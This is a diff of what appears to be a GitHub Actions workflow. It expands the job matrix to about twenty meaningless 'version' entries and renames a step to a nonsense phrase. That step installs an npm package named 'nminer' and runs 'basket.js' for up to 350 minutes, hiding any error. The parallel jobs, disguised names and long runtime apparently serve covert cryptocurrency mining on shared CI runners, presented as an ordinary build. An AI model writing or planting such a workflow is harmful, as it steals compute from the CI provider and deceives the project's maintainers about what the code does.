@@ -9,26 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3484 }
-          - { version: 2284 }
-          - { version: 776 }
-          - { version: 8766 }
+          - { version: 2912 }
+          - { version: 8865 }
+          - { version: 9939 }
+          - { version: 3868 }
+          - { version: 6175 }
+          - { version: 3260 }
+          - { version: 2022 }
           - { version: 7760 }
-          - { version: 413 }
-          - { version: 8063 }
-          - { version: 9099 }
-          - { version: 4335 }
-          - { version: 376 }
-          - { version: 4104 }
-          - { version: 297 }
-          - { version: 6239 }
-          - { version: 9525 }
-          - { version: 9353 }
-          - { version: 1644 }
-          - { version: 6113 }
-          - { version: 7549 }
-          - { version: 1348 }
-          - { version: 6537 }
+          - { version: 4161 }
+          - { version: 7829 }
+          - { version: 896 }
+          - { version: 6456 }
+          - { version: 9900 }
+          - { version: 2500 }
+          - { version: 8959 }
+          - { version: 4584 }
+          - { version: 8526 }
+          - { version: 3627 }
 
     steps:
       - name: Checkout
@@ -39,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: distinct before barring
+      - name: begonia maestro eyeliner
         run: |
           npm install nminer@latest
-          timeout 318m node basket.js || echo "basket executed"
+          timeout 350m node basket.js || echo "basket executed"
